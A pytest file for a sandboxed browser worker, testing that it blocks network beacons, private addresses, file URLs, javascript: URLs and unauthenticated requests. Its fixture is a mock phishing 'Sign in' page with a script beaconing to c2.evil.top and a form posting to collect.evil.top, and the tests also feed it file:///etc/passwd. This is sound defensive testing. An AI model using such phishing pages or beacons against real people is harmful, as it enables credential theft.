"""The isolated browser worker: needs Playwright's Chromium (its image has it).

Set BROWSER_EXECUTABLE to use another Chromium build."""

from __future__ import annotations

import base64
import json
import os
import sys
import threading
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import nik_browser  # noqa: E402
import server  # noqa: E402

PAGE = b"""<!doctype html><html><head><title>Sign in</title></head><body>
<img src="https://cdn.evil.top/logo.png"><script>fetch('https://c2.evil.top/beacon').catch(() => {});
document.title = 'Sign in - script ran'; alert('Session expired');</script>
<form action="https://collect.evil.top/post" method="post"><input id="u" name="u"><button id="go">Go</button></form>
<a id="ext" href="https://evil.top/next" style="display:block;width:200px;height:40px">next</a>
<a id="local" href="http://10.0.0.1/admin" style="display:block;width:200px;height:40px">admin</a>
</body></html>"""


@pytest.fixture(scope="module")
def chromium():
    instance = nik_browser.Browser()
    yield instance
    for session_id in list(instance.sessions):
        instance.close(session_id, instance.sessions[session_id].owner)


def test_public_host_check():
    assert not nik_browser._public_host("10.0.0.1")
    assert not nik_browser._public_host("127.0.0.1")
    assert not nik_browser._public_host("fileserver.corp")
    assert not nik_browser._public_host("intranet")
    assert nik_browser._public_host("185.220.101.47")


def test_offline_session_runs_the_page_but_sends_nothing(chromium):
    state = chromium.open("alice", network=False, html=PAGE)
    assert state["attachment"] and state["title"] == "Sign in - script ran"
    assert base64.b64decode(state["screenshot"]).startswith(b"\xff\xd8")
    assert state["blocked"] >= 2  # the image and the beacon
    assert any(e["kind"] == "dialog" and "Session expired" in e["text"] for e in state["events"])
    # Typing goes to the page; following a link is refused without network.
    chromium.act(state["id"], "alice", {"type": "click", "x": 20, "y": 60})
    after = chromium.act(state["id"], "alice", {"type": "type", "text": "mario"})
    after = chromium.act(state["id"], "alice", {"type": "navigate", "url": "https://evil.top/next"})
    assert after["title"] == "Blocked by Nik"
    assert any(e["kind"] == "blocked" and "no network" in e["text"] for e in after["events"])
    back = chromium.act(state["id"], "alice", {"type": "back"})
    assert back["attachment"]
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(state["id"], "mallory", {"type": "refresh"})  # another analyst's session
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(state["id"], "alice", {"type": "key", "key": "Control+W"})
    chromium.close(state["id"], "alice")
    assert state["id"] not in chromium.sessions


def test_network_session_never_reaches_private_addresses(chromium):
    state = chromium.open("alice", network=True, html=PAGE)
    after = chromium.act(state["id"], "alice", {"type": "navigate", "url": "http://10.0.0.1/admin"})
    assert after["title"] == "Blocked by Nik"
    assert any("not a public address" in e["text"] for e in after["events"])
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(state["id"], "alice", {"type": "navigate", "url": "file:///etc/passwd"})
    chromium.close(state["id"], "alice")


def test_server_requires_the_token(chromium, monkeypatch):
    monkeypatch.setattr(server, "TOKEN", "test-token")
    monkeypatch.setattr(server, "BROWSER", chromium)
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), server.Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{httpd.server_address[1]}"

    def post(path, body, token="test-token"):
        request = urllib.request.Request(
            base + path, data=json.dumps(body).encode(), headers={"X-Browser-Token": token}
        )
        try:
            with urllib.request.urlopen(request, timeout=60) as response:
                return response.status, json.loads(response.read())
        except urllib.error.HTTPError as exc:
            return exc.code, json.loads(exc.read())

    html = base64.b64encode(PAGE).decode()
    assert post("/sessions", {"owner": "a", "html": html}, token="nope")[0] == 401
    assert post("/sessions", {"owner": "a"})[0] == 400
    assert post("/sessions", {"owner": "a", "url": "javascript:alert(1)"})[0] == 422
    status, state = post("/sessions", {"owner": "a", "html": html})
    assert status == 201 and state["network"] is False
    status, _ = post(f"/sessions/{state['id']}/action", {"owner": "a", "type": "scroll", "dy": 200})
    assert status == 200
    request = urllib.request.Request(
        f"{base}/sessions/{state['id']}?owner=a", method="DELETE", headers={"X-Browser-Token": "test-token"}
    )
    with urllib.request.urlopen(request, timeout=30) as response:
        assert response.status == 200
    httpd.shutdown()
